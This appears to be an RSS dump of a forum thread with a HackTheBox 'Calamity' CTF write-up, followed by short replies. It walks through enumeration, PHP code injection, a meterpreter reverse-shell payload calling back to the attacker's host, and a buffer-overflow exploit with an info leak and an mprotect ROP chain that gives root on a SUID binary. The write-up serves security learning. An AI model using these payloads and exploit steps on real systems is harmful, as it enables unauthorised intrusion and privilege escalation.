0x80003070 &lt;hey+8&gt;:	0x00	0x00	0x00	0x00	0x01	0x4d	0x09	0x01
0x80003078 &lt;hey+16&gt;:	0x00	0x00	0x00	0x00	0x3c	0x66	0xf9	0x31
0x80003080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x80003088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

Okay this is the start of our hey struct, however we don&#39;t want this address, we actually want to find ```0x80003068 - 0x8 - 0x68``` as that is what will be put into ```EBX``` which after being put into ```EAX``` will put us back to right here
which if you do that math will be the address ```0x80002ff8```

With this information we can move on to the next phase of our exploit, getting an information leak of our secret value needed to get into option 3

&gt; Note: do not close the program as this changes values of our secret and there-by our information leak will be useless.

```bash
# overwrite EBX with address
# overwrite EAX with address + 0x68
# this will effectively place us right at the start of our A&#39;s because
# 0x80002ff8 + 0x68 = 0x80003060

xalvas@calamity:/tmp/test$ python -c &quot;print(&#39;A&#39; * 8 +&#39;\xf8\x2f\x00\x80&#39;)&quot; &gt; phase1
```

By loading this file and observing the print session option we get the following
```bash
xalvas@calamity:~/app$ ./goodluck 

Filename:  /tmp/test/phase1


	-----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 2

debug info: 0x1096f49
```
&lt;a name=&quot;assembling-the-pieces&quot;&gt;&lt;/a&gt;
### Assembling The Pieces
Next we need to assemble all of our pieces, we&#39;ll start by making use of this information leak. To do this we need to place the value of our secret in the first four bytes of our file, followed by 4-bytes of junk, and then we need to step back four bytes otherwise our program will crash ```0x80002ff8 - 0x4 = 0x80002ff4```

```python
#!/usr/bin/python
import struct
# session_id dumped from the previous step
payload = struct.pack(&quot;&lt;I&quot;, 0x1096f49) # session_id
# padding
payload += &quot;A&quot; * 4
# move backwards 4 so we don&#39;t leave junk in memory which will crash the program
payload += struct.pack(&quot;&lt;I&quot;, 0x80002ff4) 
print payload

xalvas@calamity:/tmp/test$ python phase2.py &gt; phase2
```

By loading this in and attepting to access admin we are dropped into our ```debug``` menu.

```bash
Filename:  /tmp/test/phase2


	-----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 3

this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff5c0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  
```

Next we just need to load in our exploit from earlier, but note the vulnerable pointer has changed to ```0xbffff5c0``` update your exploit, and [bask in the glory of shell](https://vine.co/v/OrD3uMlwThE)!

```bash
xalvas@calamity:/tmp/test$ python exploit.py &gt; exploit
```

```bash
this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff5c0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  /tmp/test/exploit
```
```bash
# id
uid=0(root) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
# cat /root/root.txt
9be653e014d17d1a54f9045e3220743c
```</description>
    
    <lastBuildDate>Sun, 28 Jan 2018 16:33:38 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/3</link>
        <pubDate>Tue, 27 Feb 2018 09:31:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5139-3</guid>
        <source url="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139.rss">HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</source>
      </item>
      <item>
        <title>HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</title>
        <dc:creator><![CDATA[hkh4cks]]></dc:creator>
        <description><![CDATA[
            <p>Awesome write-up man!!<br>
This was a great machine!! <img src="https://0x00sec.org/images/emoji/twitter/raised_hands.png?v=9" title=":raised_hands:" class="emoji" alt=":raised_hands:"></p>
          <p><a href="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/2</link>
        <pubDate>Sun, 28 Jan 2018 16:33:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5139-2</guid>
        <source url="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139.rss">HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</source>
      </item>
      <item>
        <title>HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</title>
        <dc:creator><![CDATA[dostoevsky]]></dc:creator>
        <description><![CDATA[
            <p>This is my write-up for the <a href="https://www.hackthebox.eu/home/machines/profile/37" rel="nofollow noopener">Calamity</a> machine provided by <a href="https://www.hackthebox.eu" rel="nofollow noopener">HackTheBox</a> and created by <a href="https://www.hackthebox.eu/home/users/profile/198" rel="nofollow noopener">forGP</a>.</p>
<p>To get root you are required to write a custom exploit that re-enables data execution on the stack and to know how to dance around in memory like a boss. I’m still a little hazy on some parts so if there are any inaccuracies in the stack breakdown, please correct me so I can learn more <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>This was my favorite machine on HackTheBox I’ll be breaking the post up into three phases:</p>
<blockquote>
<p><a href="https://0x00sec.org#enumeration">Phase 1 - Enumeration</a><br>
<a href="https://0x00sec.org#exploitation">Phase 2 - Exploitation</a><br>
<a href="https://0x00sec.org#privilege-escalation">Phase 3 - Privilege Escalation</a></p>
<blockquote>
<p><a href="https://0x00sec.org#source-code-review">Source Code Review</a><br>
<a href="https://0x00sec.org#exploit-development">Exploit Development</a><br>
<a href="https://0x00sec.org#information-leak">Information Leak</a><br>
<a href="https://0x00sec.org#assembling-the-pieces">Assembling The Pieces</a></p>
</blockquote>
</blockquote>
<p>Shall we take a trip down memory lane? <img src="https://0x00sec.org/images/emoji/twitter/eyes.png?v=9" title=":eyes:" class="emoji" alt=":eyes:"></p>
<p><a name="enumeration" href="https://0x00sec.org"></a></p>
<h2>Phase 1 - Enumeration</h2>
<p>First and foremost lets run a basic <code>nmap</code> scan and see what we are working with</p>
<pre><code class="lang-bash">➜  ~ nmap -A --open -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.27

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-15 19:37 EST
Nmap scan report for 10.10.10.27
Host is up (0.12s latency).
Not shown: 794 closed ports, 204 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
</code></pre>
<p>Let’s check out the <code>Apache</code> server running on port 80 first, we’ll start by curling the source code.</p>
<pre><code class="lang-bash">➜  ~ curl http://10.10.10.27
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Brotherhood Software&lt;/title&gt;
&lt;/head&gt;
&lt;body background="bg.png"&gt;
&lt;center&gt;
&lt;h1 style="color:red"&gt;Brotherhood Software - writing security related software since 2009&lt;/h1&gt;
&lt;!-- and bad at html and design since forever --&gt;
&lt;div style="opacity:0.4;"&gt;
&lt;img src="leet.png"/&gt;
&lt;/div&gt;

&lt;div style="color:red"&gt;this e-store is under development !Haven't done much yet because we put a lot of time on our pro-products &lt;!-- liiiieeesss --&gt;^_^ ...but it will soon be operating
&lt;/div&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Looks like forGP gave us a hint that these guys weren’t very competent developers. This will become clear later.</p>
<p>Let’s do a little dirbusting with <code>wfuzz</code> and our <code>admin-panels.txt</code> wordlist.</p>
<pre><code class="lang-bash">➜  ~ wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/admin-panels.txt http://10.10.10.27/FUZZ
Target: HTTP://10.10.10.27/FUZZ
Total requests: 137

========================================================================
ID	Response    Lines	Word		Chars		Payload
========================================================================

00001:	C=200	    10 L	25 W		451 Ch		"admin.php"

Total time: 2.725248
Processed Requests: 137
Filtered Requests: 136
Requests/sec.: 50.27065
</code></pre>
<p>Our wfuzz came back fruitful within seconds, by visitng admin.php we are greeted with the login form. After viewing the source and trying a few SQL Injections and getting no where I decided to curl the page.</p>
<pre><code class="lang-bash">➜  ~ curl http://10.10.10.27/admin.php
&lt;html&gt;&lt;body&gt;

&lt;form method="post"&gt;
Password: &lt;input type="text" name="user"&gt;&lt;br&gt;
Username: &lt;input type="password" name="pass"&gt;
  &lt;input type="submit" value="Log in to the powerful administrator page"&gt;
&lt;!-- password is:skoupidotenekes--&gt;
&lt;/form&gt; 
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>Here we see the highly skilled developer left the password for his admin panel in an html comment, cleverly hidden away on the far right side of the source code. Not that curl cares. After logging in we have this lovely piece of work</p>
<pre><code class="lang-bash">➜  ~ curl --cookie "adminpowa=noonecares" http://10.10.10.27/admin.php


&lt;html&gt;
&lt;title&gt;GOT U BEEJAY&lt;/title&gt;
&lt;body&gt;
TADAA IT HAS NOTHING
&lt;br&gt;
what were you waiting for dude ?you know I aint finished creating&lt;br&gt;
xalvas,the boss said I am a piece of shit and that I dont take my job seriously...but when all this is set up...Ima ask for double the money&lt;br&gt;
just cauz he insulted me &lt;br&gt;
Maybe he's still angry at me deleting the DB on the previous site...he should keep backups man ! 
&lt;br&gt;
anyway I made an html interpreter to work on my php skills !

It wasn't easy I assure you...I'm just a P-R-O on PHP !!!!!!!!!
&lt;br&gt;
access in here is like 99% secure ,but even if that 1% reaches this page ,there's nothing they can do ! 
&lt;br&gt;
html is super-harmless to our system!
Try writing some simple stuff ...and see how difficult my job is and how underpaid I am



&lt;form method="get"&gt;
Your HTML: &lt;input type="text" name="html"&gt;&lt;br&gt;
  &lt;input type="submit" value="SHOW ME DA PAGE"&gt;
&lt;/form&gt; 
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p><a name="exploitation" href="https://0x00sec.org"></a></p>
<h2>Phase 2 - Exploitation</h2>
<p>Reading this message hurt my brain but once I saw “I’m just a P-R-O on PHP” it was time for the most elite remote code execution<br>
<em>&lt;?php phpinfo(); ?&gt;</em></p>
<p>Much to my surprise this worked.</p>
<p>Wasting absolutely no more time I grabbed a meterpreter session using a msfvenom payload.</p>
<pre><code class="lang-bash">➜  ~ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.15.140 lport=4433 -o test.php
</code></pre>
<pre><code class="lang-bash">msf &gt; use multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
payload =&gt; php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost tun0
lhost =&gt; tun0
msf exploit(multi/handler) &gt; set lport 4433
lport =&gt; 4433
msf exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.15.140:4433 
[*] Sending stage (37543 bytes) to 10.10.10.27
[*] Meterpreter session 1 opened (10.10.15.140:4433 -&gt; 10.10.10.27:52006) at 2018-01-15 19:52:23 -0500

meterpreter &gt; getuid
Server username: www-data (33)
</code></pre>
<p>Now with a shell it was time to poke around the box a bit</p>
<pre><code class="lang-bash">meterpreter &gt; ls /home
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2018-01-15 17:34:16 -0500  xalvas

meterpreter &gt; cd /home/xalvas
meterpreter &gt; ls
Listing: /home/xalvas
=====================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100644/rw-r--r--  220      fil   2017-06-27 19:25:56 -0400  .bash_logout
100644/rw-r--r--  3790     fil   2017-06-27 19:26:45 -0400  .bashrc
40700/rwx------   4096     dir   2017-06-27 19:36:23 -0400  .cache
40750/rwxr-x---   4096     dir   2018-01-15 17:34:16 -0500  .config
100664/rw-rw-r--  43       fil   2017-06-27 18:11:27 -0400  .gdbinit
40775/rwxrwxr-x   4096     dir   2017-06-27 19:24:52 -0400  .nano
100644/rw-r--r--  655      fil   2017-06-27 19:26:07 -0400  .profile
100644/rw-r--r--  0        fil   2017-06-27 13:03:39 -0400  .sudo_as_admin_successful
40755/rwxr-xr-x   4096     dir   2017-06-27 18:01:12 -0400  alarmclocks
40750/rwxr-x---   4096     dir   2017-06-29 14:00:44 -0400  app
100644/rw-r--r--  225      fil   2017-06-27 18:16:26 -0400  dontforget.txt
100644/rw-r--r--  3759     fil   2018-01-15 19:49:28 -0500  intrusions
40775/rwxrwxr-x   4096     dir   2017-06-27 18:09:07 -0400  peda
100644/rw-r--r--  3196724  fil   2017-06-27 18:00:49 -0400  recov.wav
100444/r--r--r--  33       fil   2017-12-24 10:31:11 -0500  user.txt

meterpreter &gt; cat user.txt
0790e7be60d5cd7faeeb9ac550762e5e
</code></pre>
<p>This is where it gets a little CTF-y briefly, strap in, <em>sudo apt-get install audacity</em>, and if you’re like me cry a little at being forced to do steganography.</p>
<pre><code class="lang-bash">meterpreter &gt; download recov.wav
[*] Downloading: recov.wav -&gt; recov.wav
[*] Downloaded 1.00 MiB of 3.05 MiB (32.8%): recov.wav -&gt; recov.wav
[*] Downloaded 2.00 MiB of 3.05 MiB (65.6%): recov.wav -&gt; recov.wav
[*] Downloaded 3.00 MiB of 3.05 MiB (98.4%): recov.wav -&gt; recov.wav
[*] Downloaded 3.05 MiB of 3.05 MiB (100.0%): recov.wav -&gt; recov.wav
[*] download   : recov.wav -&gt; recov.wav
meterpreter &gt; download alarmclocks/rick.wav
[*] Downloading: alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 1.00 MiB of 3.05 MiB (32.8%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 2.00 MiB of 3.05 MiB (65.6%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 3.00 MiB of 3.05 MiB (98.41%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 3.05 MiB of 3.05 MiB (100.0%): alarmclocks/rick.wav -&gt; rick.wav
[*] download   : alarmclocks/rick.wav -&gt; rick.wav
</code></pre>
<p>Load the <code>rick.wav</code> into audacity, and then import <code>recov.wav</code></p>
<p>Click on <code>rick.wav</code> and add an invert effect, now instead of being rick roll’d by <code>forGP</code> we can hear it read out a password, note that the password starts at the end of the track and continues reading into the beginning.<br>
Your password is 18547936…*</p>
<p>There’s no way it could possibly be the <code>ssh</code> login!<br>
<a name="privilege-escalation" href="https://0x00sec.org"></a></p>
<h2>Phase 3 - Privilege Escalation</h2>
<blockquote>
<p>But It was the ssh login.</p>
</blockquote>
<pre><code class="lang-bash">➜  ~ ssh xalvas@10.10.10.27
xalvas@10.10.10.27s password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

9 packages can be updated.
8 updates are security updates.


Last login: Mon Jan 15 19:21:45 2018 from 10.10.14.56
xalvas@calamity:~$ 
</code></pre>
<p>Having a look around we found a binary with the suid bit set without even needing to run the <code>find</code> command</p>
<pre><code class="lang-bash">xalvas@calamity:~$ ls -la app
total 28
drwxr-x--- 2 root   xalvas  4096 Jun 29  2017 .
drwxr-xr-x 8 xalvas xalvas  4096 Jan 15 17:34 ..
-r-sr-xr-x 1 root   root   12584 Jun 29  2017 goodluck  &lt;-- look ma, suid
-r--r--r-- 1 root   root    3936 Jun 29  2017 src.c
</code></pre>
<p>Seems as though this is going to be like babytown frollicks! A suid binary <em>and</em> the source code?! Let’s examine the source to get an idea as to how to approach this.<br>
<a name="source-code-review" href="https://0x00sec.org"></a></p>
<h3>Source Code Review</h3>
<p>This seems important as it’s creating a buffer of USIZE where data may potentially be user suplied.</p>
<pre><code class="lang-auto">#define USIZE 12
#define ISIZE 4

  struct f {
    char user[USIZE];
    //int user;
    int secret;
    int admin;
    int session;
  }
hey;
</code></pre>
<p>This is allowing for user input in the form of a file to be supplied to the application and as we suspected the file contents are then copied into the previous struct’s user buffer.</p>
<pre><code class="lang-auto">void createusername() {
//I think  something's bad here
unsigned char for_user[ISIZE];

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", &amp; fn);

flushit();
  copy(fn, for_user,USIZE);


 strncpy(hey.user,for_user,ISIZE+1);
  hey.user[ISIZE+1]=0;

}
</code></pre>
<p>Honestly I don’t need to read anything else when you literally tell me this is vulnerable, I’m going to start here.</p>
<pre><code class="lang-auto">void debug() {

  printf("\nthis function is problematic on purpose\n");
  printf("\nI'm trying to test some things...and that means get control of the program! \n");

  char vuln[64];

  printf("vulnerable pointer is at %x\n", vuln);
  printf("memory information on this binary:\n", vuln);

  printmaps();

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", &amp; fn);
  flushit();
  copy(fn,vuln,100);//this shall trigger a buffer overflow

  return;

}
</code></pre>
<p>But just to be good padawans we have to look a little more, if nothing else just to put it into the back of our mind, we might need it later! This is definitely going to be interesting as it’s a way to gain administrative privileges to the app, however you need to have a <code>secret</code> and it has to match. There doesn’t appear to be a way to pass the login within the app so we likely will have to pass it through file contents, but we’ll see.</p>
<pre><code class="lang-auto">void attempt_login(int shouldbezero, int safety1, int safety2) {

  if (safety2 != safety1) {
    printf("hackeeerrrr");
    fflush(stdout);
	exit(666);
  }
  if (shouldbezero == 0) {
    printf("\naccess denied!\n");
    fflush(stdout);
  } else debug();

}
</code></pre>
<p>So here we see how our <code>secret</code> gets defined, and it is not something we directly seem to control, however we will come back to this later.</p>
<pre><code class="lang-auto">int sess= rand();

  struct timeval tv;
  gettimeofday( &amp; tv, NULL);

  int whoopsie=0;
  int protect = tv.tv_usec |0x01010101;//I hate null bytes...still secure !


  hey.secret = protect;
  hey.session = sess;
  hey.admin = 0;


  createusername();

  while (1) {
    char action = print();

    if (action == '1') {
      //I striped the code for security reasons !

    } else if (action == '2') {
      printdeb(hey.session);
    } else if (action == '3') {
      attempt_login(hey.admin, protect, hey.secret);
      //I'm changing the program ! you will never be to log in as admin...
      //I found some bugs that can do us a lot of harm...I'm trying to contain them but I think I'll have to
      //write it again from scratch !I hope it's completely harmless now ...
    }

    else if(action=='4')createusername();
    else if (action == '5') return;

  }
</code></pre>
<p><a name="exploit-development" href="https://0x00sec.org"></a></p>
<h3>Exploit Development</h3>
<p>First lets run the program and then press ctrl+c to examine some basic information peda supplies to us. We can also run <code>checksec</code> to see what kind of security mechanisms are in place.</p>
<pre><code class="lang-auto">xalvas@calamity:~/app$ gdb -q goodluck
Reading symbols from goodluck...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/xalvas/app/goodluck 
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffdfc 
EBX: 0xbffff5d8 --&gt; 0x1 
ECX: 0xbffff5d8 --&gt; 0x1 
EDX: 0x7fffffff 
ESI: 0xb7ffd940 (0xb7ffd940)
EDI: 0xbffff5d8 --&gt; 0x1 
EBP: 0x0 
ESP: 0xbffff59c --&gt; 0x0 
EIP: 0xb7fdac31 (&lt;__kernel_vsyscall+9&gt;:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7fdac2b &lt;__kernel_vsyscall+3&gt;:	mov    ebp,esp
   0xb7fdac2d &lt;__kernel_vsyscall+5&gt;:	sysenter 
   0xb7fdac2f &lt;__kernel_vsyscall+7&gt;:	int    0x80
=&gt; 0xb7fdac31 &lt;__kernel_vsyscall+9&gt;:	pop    ebp
   0xb7fdac32 &lt;__kernel_vsyscall+10&gt;:	pop    edx
   0xb7fdac33 &lt;__kernel_vsyscall+11&gt;:	pop    ecx
   0xb7fdac34 &lt;__kernel_vsyscall+12&gt;:	ret    
   0xb7fdac35:	retf   0xfffa
[------------------------------------stack-------------------------------------]
0000| 0xbffff59c --&gt; 0x0 
0004| 0xbffff5a0 --&gt; 0x7fffffff 
0008| 0xbffff5a4 --&gt; 0xbffff5d8 --&gt; 0x1 
0012| 0xbffff5a8 --&gt; 0xb7eca3a0 (&lt;__nanosleep_nocancel+22&gt;:	mov    ebx,edx)
0016| 0xbffff5ac --&gt; 0xb7eca2fd (&lt;__sleep+109&gt;:	add    esp,0x10)
0020| 0xbffff5b0 --&gt; 0xbffff5d8 --&gt; 0x1 
0024| 0xbffff5b4 --&gt; 0xbffff5d8 --&gt; 0x1 
0028| 0xbffff5b8 --&gt; 0xc2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xb7fdac31 in __kernel_vsyscall ()
</code></pre>
<pre><code class="lang-bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

</code></pre>
<p>Here we can see some interesting bits. First we notice that NX is enabled, this means that data execution will be disabled in the context of the stack. So even if we are able to overwrite memory, or even the Instruction Pointer we will be unable to execute shellcode unless we can find a way to re-enable data execution on the stack. Interestingly, peda returned to us a <code>pop pop pop ret</code> rop chain which starts at <code>0xb7fdac31</code>.</p>
<p>Next let’s hop into the debug menu we learned about earlier and see what’s what with <code>jump debug</code></p>
<pre><code class="lang-auto">gdb-peda$ jump debug
Continuing at 0x80000c15.

this function is problematic on purpose

I'm trying to test some things...and that means get control of the program! 
vulnerable pointer is at bfffee48
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  
</code></pre>
<p>This provides us with some good information from the memorymaps, namely we learn that the vulnerable pointer is at <code>0xbfffee48</code> and that the stack is located at <code>0xbfedf000-c0000000</code></p>
<p>Before we move forward with learning how we can re-enable execution in the context of the stack, lets see what we’re working with</p>
<pre><code class="lang-auto">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 &gt; fuzzfile
</code></pre>
<p>Load this file into the <code>debug</code> menu and attempt to view the session id with menu option 2, then examine the crash</p>
<pre><code class="lang-auto">Stopped reason: SIGSEGV
0x63413563 in ?? ()
</code></pre>
<p>With this information we can find the exact offset for our exploit</p>
<pre><code class="lang-auto">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
</code></pre>
<p>Now that we have this information we need to figure out how to re-enable execution on the stack, lets start by disassembling main</p>
<pre><code class="lang-bash">gdb-peda$ disas main
Dump of assembler code for function main:
   0x80000d77 &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x80000d7b &lt;+4&gt;:	and    esp,0xfffffff0
   0x80000d7e &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x80000d81 &lt;+10&gt;:	push   ebp
   0x80000d82 &lt;+11&gt;:	mov    ebp,esp
   0x80000d84 &lt;+13&gt;:	push   ebx
   0x80000d85 &lt;+14&gt;:	push   ecx
   0x80000d86 &lt;+15&gt;:	sub    esp,0x20
   0x80000d89 &lt;+18&gt;:	call   0x80000820 &lt;__x86.get_pc_thunk.bx&gt;
   0x80000d8e &lt;+23&gt;:	add    ebx,0x2272
   0x80000d94 &lt;+29&gt;:	push   0x1
   0x80000d96 &lt;+31&gt;:	push   0x3add6
   0x80000d9b &lt;+36&gt;:	push   0xb7e1a000
   0x80000da0 &lt;+41&gt;:	call   0xb7efcd50 &lt;mprotect&gt;
   ---trimmed due to length---
</code></pre>
<p>After researching <code>mprotect</code>, I learned that it can be used to re-enable execution on the stack via the <a href="http://man7.org/linux/man-pages/man2/mprotect.2.html" rel="nofollow noopener">entry</a> in the linux manual.</p>
<p>Now <code>mprotect</code> takes three arguments, hence the <code>pop pop pop ret</code> <code>peda</code> returned to us earlier. The first argument is the mapped region of memory, the second is the size of the stack, and the third are the permissions.</p>
<p>We already know the mapped region from the stack output of the <code>debug</code> memorymaps and we already know we want to set it to <code>0x7</code> for executable.</p>
<p>We just need to calculate the size of the stack, I use <a href="http://www.csgnetwork.com/hexaddsubcalc.html" rel="nofollow noopener">this</a> tool. By subtracting <code>0xbfedf000</code> from <code>0xc0000000</code> we get <code>0x121000</code></p>
<p>With this information we can build a template for our exploit!</p>
<pre><code class="lang-python"># re-enable execution on the stack
payload += p(0xb7efcd50) # mprotect
payload += p(0xb7fdac31) # ropgadget for pop3ret
